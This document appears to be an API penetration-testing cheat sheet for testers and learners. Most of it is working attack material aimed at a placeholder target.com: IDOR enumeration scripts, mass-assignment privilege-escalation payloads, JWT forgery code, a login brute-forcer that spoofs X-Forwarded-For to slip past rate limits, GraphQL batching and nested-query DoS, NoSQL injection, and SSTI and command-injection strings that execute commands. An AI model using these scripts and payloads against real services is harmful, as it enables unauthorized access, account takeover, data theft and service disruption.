# API Exploitation

> Technical deep-dive into API security testing with payloads and exploitation techniques.

---

## API Reconnaissance

### 1.1 API Discovery

**Common API Paths**:
```
/api
/api/v1
/api/v2
/api/v3
/v1
/v2
/graphql
/graphiql
/swagger
/swagger-ui
/swagger.json
/openapi.json
/api-docs
/docs
/redoc
```

**Discovery Tools**:
```bash
# Directory fuzzing for API endpoints
ffuf -u https://target.com/FUZZ -w api-wordlist.txt

# Kiterunner - API endpoint discovery
kr scan https://target.com -w routes-large.kite

# Find API documentation
curl https://target.com/swagger.json
curl https://target.com/openapi.json
curl https://target.com/api-docs
```

### 1.2 API Documentation Analysis

**Extract from Swagger/OpenAPI**:
```bash
# Parse OpenAPI spec
python3 -c "
import json
spec = json.load(open('openapi.json'))
for path, methods in spec['paths'].items():
    for method, details in methods.items():
        print(f'{method.upper()} {path}')
"

# Generate Postman collection from OpenAPI
openapi2postman -i openapi.json -o collection.json
```

---

## IDOR (Insecure Direct Object Reference)

### 2.1 Detection

**Common IDOR Parameters**:
```
?id=
?user_id=
?account_id=
?doc_id=
?order_id=
?profile_id=
?uid=
/users/{id}
/orders/{id}
/documents/{id}
```

**Testing Workflow**:
```
1. Create 2 accounts: user_A (id=100), user_B (id=101)
2. Login as user_A
3. Access user_A's resource: GET /api/users/100/data
4. Change ID to user_B: GET /api/users/101/data
5. If accessible → IDOR vulnerability
```

### 2.2 Exploitation Techniques

**Numeric ID Enumeration**:
```bash
# Burp Intruder / ffuf
ffuf -u https://target.com/api/users/FUZZ -w numbers.txt -H "Authorization: Bearer TOKEN"

# Python script
for user_id in range(1, 10000):
    resp = requests.get(f"https://target.com/api/users/{user_id}",
                       headers={"Authorization": f"Bearer {token}"})
    if resp.status_code == 200:
        print(f"Accessible: {user_id} - {resp.text[:100]}")
```

**UUID/GUID IDOR**:
```bash
# Predictable UUID (timestamp-based)
# Example: UUID v1 contains timestamp
# Can enumerate if pattern is discovered

# Leaked UUIDs in responses
# Check: other endpoints, JS files, error messages

# Parameter pollution
GET /api/users/my-uuid?user_id=target-uuid
GET /api/users/my-uuid,target-uuid
```

**Chained IDOR**:
```markdown
1. IDOR in listing endpoint → Get target's resource IDs
   GET /api/company/123/users → Returns user IDs

2. IDOR in detail endpoint → Access target's data
   GET /api/users/456/profile → Access user 456's profile

3. IDOR in action endpoint → Modify target's data
   PUT /api/users/456/email → Change user 456's email
```

### 2.3 Bypass Techniques

```
# Wrapping ID in array
GET /api/users/[101]

# Adding extra characters
GET /api/users/101%00
GET /api/users/101.json
GET /api/users/101/

# HTTP parameter pollution
GET /api/users/100?id=101

# JSON body manipulation
{"user_id": "100", "user_id": "101"}  # Second wins
{"user_id": ["100", "101"]}

# Wildcard
GET /api/users/*
GET /api/users/..
```

---

## Mass Assignment

### 3.1 Detection

**Identify Writable Fields**:
```http
# Original request
POST /api/users/register
{"username": "test", "email": "test@test.com", "password": "test123"}

# Add extra fields
POST /api/users/register
{
    "username": "test",
    "email": "test@test.com",
    "password": "test123",
    "role": "admin",
    "is_admin": true,
    "isAdmin": 1,
    "admin": true,
    "access_level": 999,
    "user_type": "administrator"
}
```

### 3.2 Common Vulnerable Fields

```json
{
    // Role/Permission escalation
    "role": "admin",
    "is_admin": true,
    "permissions": ["read", "write", "delete", "admin"],
    "access_level": 10,
    "user_type": "superuser",

    // Account manipulation
    "verified": true,
    "email_verified": true,
    "active": true,
    "approved": true,

    // Billing bypass
    "plan": "enterprise",
    "subscription": "premium",
    "credits": 999999,
    "balance": 999999,

    // Owner/tenant manipulation
    "organization_id": "target_org",
    "tenant_id": "target_tenant",
    "owner_id": "target_owner"
}
```

### 3.3 Exploitation Script

```python
import requests
import itertools

base_payload = {"username": "test", "email": "test@test.com"}

# Fields to try
admin_fields = {
    "role": ["admin", "administrator", "superuser", "root"],
    "is_admin": [True, 1, "true", "1"],
    "admin": [True, 1, "true", "1"],
    "access_level": [999, 10, 1, 0],
    "user_type": ["admin", "administrator", "superuser"],
    "permissions": [["admin"], ["*"], ["all"]],
}

for field, values in admin_fields.items():
    for value in values:
        payload = {**base_payload, field: value}
        resp = requests.post("https://target.com/api/users", json=payload)
        print(f"Testing {field}={value}: {resp.status_code}")
        if resp.status_code == 200:
            # Check if escalation worked
            user_data = resp.json()
            print(f"  Response: {user_data}")
```

---

## Broken Authentication

### 4.1 JWT Attacks

**None Algorithm Attack**:
```python
import jwt
import base64

# Decode original token (without verification)
token = "eyJ..."
header, payload, signature = token.split('.')
decoded_payload = json.loads(base64.urlsafe_b64decode(payload + '=='))

# Modify payload
decoded_payload['role'] = 'admin'

# Create token with "none" algorithm
new_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
new_payload = base64.urlsafe_b64encode(json.dumps(decoded_payload).encode()).rstrip(b'=')
forged_token = f"{new_header.decode()}.{new_payload.decode()}."
```

**Algorithm Confusion (RS256 → HS256)**:
```python
import jwt

# Get public key (often exposed in JWKS endpoint)
# GET /.well-known/jwks.json
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjAN...
-----END PUBLIC KEY-----"""

# Sign with HS256 using public key as secret
payload = {"user": "admin", "role": "admin"}
token = jwt.encode(payload, public_key, algorithm="HS256")
```

**JWT Secret Brute Force**:
```bash
# Using jwt_tool
jwt_tool TOKEN -C -d /path/to/wordlist.txt

# Using hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# Common weak secrets
secret
password
123456
jwt_secret
your-256-bit-secret
```

**JWK Header Injection**:
```python
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generate own key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Create JWK from public key
jwk = {
    "kty": "RSA",
    "n": base64url_encode(public_key.public_numbers().n),
    "e": base64url_encode(public_key.public_numbers().e),
}

# Sign with embedded JWK
payload = {"user": "admin"}
headers = {"jwk": jwk}
token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
```

### 4.2 API Key Attacks

**Finding API Keys**:
```bash
# In JavaScript files
grep -r "api_key" *.js
grep -r "apiKey" *.js
grep -r "Authorization" *.js

# In mobile apps
apktool d app.apk
grep -rn "api" ./app/

# In version control
trufflehog git https://github.com/target/repo
gitleaks detect --source=/path/to/repo

# Common patterns
grep -E "[a-zA-Z0-9]{32}" *
grep -E "sk_live_[a-zA-Z0-9]{24}" *  # Stripe
grep -E "AKIA[0-9A-Z]{16}" *  # AWS
```

**API Key Scope Testing**:
```bash
# Test different endpoints with same key
curl -H "X-API-Key: FOUND_KEY" https://target.com/api/v1/users
curl -H "X-API-Key: FOUND_KEY" https://target.com/api/v1/admin
curl -H "X-API-Key: FOUND_KEY" https://target.com/api/v1/internal

# Test different HTTP methods
curl -X GET -H "X-API-Key: KEY" https://target.com/api/resource
curl -X POST -H "X-API-Key: KEY" https://target.com/api/resource
curl -X DELETE -H "X-API-Key: KEY" https://target.com/api/resource
```

---

## Rate Limiting Bypass

### 5.1 Bypass Techniques

**IP-Based Bypass**:
```http
# Add headers to spoof IP
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Rotate IPs
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 1.2.3.5
X-Forwarded-For: 1.2.3.6
```

**Request Modification**:
```http
# Case variation
POST /API/login
POST /Api/login
POST /api/LOGIN

# Path manipulation
POST /api/./login
POST /api//login
POST /api/login/
POST /api/login?
POST /api/login#

# Method variation (if endpoint accepts multiple)
POST /api/login
PUT /api/login
```

**Parameter Manipulation**:
```http
# Add null bytes
POST /api/login
{"username": "admin%00", "password": "test"}

# Add random parameters
POST /api/login
{"username": "admin", "password": "test", "random": "abc123"}

# Array parameters
POST /api/login
{"username": ["admin"], "password": ["test"]}
```

### 5.2 Brute Force with Rate Limit Bypass

```python
import requests
import random
import string

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def brute_force(username, passwords):
    for pwd in passwords:
        headers = {
            "X-Forwarded-For": random_ip(),
            "X-Real-IP": random_ip(),
        }

        # Add random query param to bypass caching
        url = f"https://target.com/api/login?_={''.join(random.choices(string.ascii_lowercase, k=8))}"

        resp = requests.post(url,
                           json={"username": username, "password": pwd},
                           headers=headers)

        if resp.status_code == 200 and "success" in resp.text:
            print(f"Found: {username}:{pwd}")
            return pwd
    return None
```

---

## GraphQL Attacks

### 6.1 Introspection

**Enable Introspection Query**:
```graphql
# Full schema introspection
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# Get all queries
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# Get mutations
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
        }
      }
    }
  }
}
```

**Tools**:
```bash
# GraphQL Voyager - visualize schema
# InQL - Burp extension

# clairvoyance - bypass disabled introspection
python3 clairvoyance.py -w wordlist.txt -o output.json https://target.com/graphql
```

### 6.2 Batching Attacks

**Brute Force via Batching**:
```graphql
# Single request, multiple operations
mutation {
  login0: login(username: "admin", password: "password1") { token }
  login1: login(username: "admin", password: "password2") { token }
  login2: login(username: "admin", password: "password3") { token }
  login3: login(username: "admin", password: "password4") { token }
  login4: login(username: "admin", password: "password5") { token }
  # ... up to hundreds of attempts
}
```

**DoS via Complex Queries**:
```graphql
# Nested query attack
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### 6.3 Injection in GraphQL

**SQL Injection**:
```graphql
query {
  user(name: "admin' OR '1'='1") {
    id
    email
    password
  }
}
```

**Authorization Bypass**:
```graphql
# If user field is exposed
query {
  user(id: 1) {
    id
    username
    email
    password_hash  # Might be exposed
    role
    api_keys {
      key
    }
  }
}
```

---

## API Injection Attacks

### 7.1 NoSQL Injection

**MongoDB Injection**:
```json
// Authentication bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// Extract data
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

// Operator injection
{"username": "admin", "password": {"$regex": ".*"}}

// $where injection
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}
```

### 7.2 Server-Side Template Injection (SSTI)

**Detection**:
```
# In any user input that gets rendered
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
```

**Exploitation by Template Engine**:
```python
# Jinja2 (Python)
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[FIND_SUBPROCESS].__init__.__globals__['popen']('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
${"freemarker.template.utility.Execute"?new()("id")}
```

### 7.3 Command Injection via API

```bash
# In JSON parameters
{"filename": "test; id"}
{"filename": "test | id"}
{"filename": "test `id`"}
{"filename": "test $(id)"}

# In URL parameters
?file=test%3Bid
?file=test%7Cid

# Bypass filters
{"cmd": "i\x64"}  # hex encoding
{"cmd": "i''d"}   # quote insertion
{"cmd": "i$()d"}  # empty command substitution
```

---

## Quick Reference: API Testing Checklist

```markdown
□ Authentication
  □ JWT vulnerabilities (none alg, key confusion)
  □ API key exposure and scope
  □ Session management flaws
  □ Password reset flow

□ Authorization
  □ IDOR on all endpoints
  □ Horizontal privilege escalation
  □ Vertical privilege escalation
  □ Mass assignment

□ Input Validation
  □ SQL injection
  □ NoSQL injection
  □ Command injection
  □ SSTI

□ Rate Limiting
  □ Authentication endpoints
  □ Resource-intensive endpoints
  □ Bypass techniques

□ Data Exposure
  □ Verbose error messages
  □ Stack traces
  □ Sensitive data in responses
  □ Debug endpoints

□ GraphQL Specific
  □ Introspection enabled
  □ Batching attacks
  □ Nested query DoS
  □ Authorization per field

□ Business Logic
  □ Workflow bypass
  □ Price manipulation
  □ Quantity manipulation
  □ Race conditions
```

---

## Tools

```bash
# API testing
Burp Suite Professional
Postman + Postman Interceptor
Insomnia

# Automated scanning
nuclei -u https://api.target.com -t nuclei-templates/http/exposures/apis/
wfuzz -w wordlist.txt https://api.target.com/FUZZ

# GraphQL
InQL (Burp extension)
graphql-voyager
BatchQL

# JWT
jwt_tool
jwt.io
jwt-cracker
```
